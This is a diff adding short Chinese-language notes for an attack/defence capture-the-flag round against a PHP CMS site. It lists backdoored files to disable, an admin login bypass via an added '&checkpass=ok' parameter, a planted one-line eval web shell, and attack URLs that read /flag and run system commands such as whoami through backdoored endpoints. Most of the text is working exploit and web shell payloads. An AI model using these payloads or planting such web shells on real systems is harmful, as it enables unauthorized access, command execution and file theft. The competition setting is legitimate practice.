@@ -1,0 +1,40 @@
+防守：
+F12禁用
+
+/var/www/html/framework/api
+ls -la//查看隐藏文件
+cp .cat.php .cat.php.bak
+vim.tiny .cat.php 第四行#
+
+/var/www/html/langs
+cp lang_www.php lang_www.php.bak
+vim.tiny lang_www.php (if(isset($_GET['phpok']))echo readfile($_GET['phpok']);注释掉--第十行)
+
+/var/www/html/framework/
+cp init.php init.php.bak
+vim.tiny  init.php(#header($cck=`cat /f*`注释掉--第十六行);)
+
+访问admin.php
+burp suite加上&checkpass=ok
+后台登进
+设置》风格管理》编辑》后缀名改为php
+设置》风格管理》文件管理》新建a.php
+cd /var/www/html/tpl/www
+vim.tiny a.php
+#<?p###hp @ev###al($_G###ET['s####']); ?>
+一句话木马(tpl/www/a.php?s=system('cat /flag')；
+新建一个其他得管理员，用新建的管理员登陆，然后禁用admin
+
+攻：
+F12
+langs/lang_www.php?phpook=/flag
+framework/api/.cat.php?api=whoami&apiuser=system
+framework/api/.cat.php?api=cat%20/flag&apiuser=system
+
+
+
+
+
+
+
+
